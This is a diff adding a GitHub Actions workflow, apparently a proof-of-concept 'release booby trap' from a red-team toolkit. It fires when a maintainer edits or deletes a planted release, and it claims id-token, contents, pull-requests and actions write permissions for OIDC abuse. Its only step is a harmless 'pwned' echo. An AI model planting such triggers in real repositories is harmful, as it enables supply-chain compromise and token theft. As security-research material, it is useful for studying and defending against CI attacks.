@@ -1,0 +1,37 @@
+# The BOMB payload — a workflow that gets tree-spliced into an orphan
+# commit by the planter workflow.
+#
+# This YAML is embedded as a string inside planter.yml and planted via
+# the Git Data API.  It is NOT committed to any branch — it only exists
+# at an orphan SHA referenced by a release's target_commitish.
+#
+# Canonical reference: https://github.com/Dev11940518/release-bomb-demo
+# License: Apache-2.0 (same as gato-x)
+#
+# ## Why this pattern?
+#
+# - Trigger on `release: [edited, deleted]`: fired when a maintainer
+#   or bot touches the planted release (rename, delete, toggle draft,
+#   upload asset, etc.).
+# - Loop prevention: the planter publishes via GITHUB_TOKEN, which
+#   GitHub suppress.  The detonation actor is NOT GITHUB_TOKEN, so
+#   loop prevention does not apply.
+# - Elevated permissions: id-token: write for OIDC abuse, contents: write,
+#   pull-requests: write, actions: write — whatever the attacker wants.
+
+name: Release Booby Trap
+
+on:
+  release:
+    types: [edited, deleted]
+
+jobs:
+  fire:
+    permissions:
+      id-token: write
+      contents: write
+      pull-requests: write
+      actions: write
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "pwned — release booby trap detonated"
